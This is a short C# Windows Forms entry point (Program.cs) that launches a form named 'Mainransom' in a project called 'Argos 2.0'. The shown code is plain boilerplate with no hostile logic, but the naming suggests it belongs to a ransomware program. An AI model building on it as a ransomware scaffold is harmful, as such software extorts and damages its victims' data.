using System;
using System.Windows.Forms;

namespace Argos_2._0;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Mainransom());
	}
}
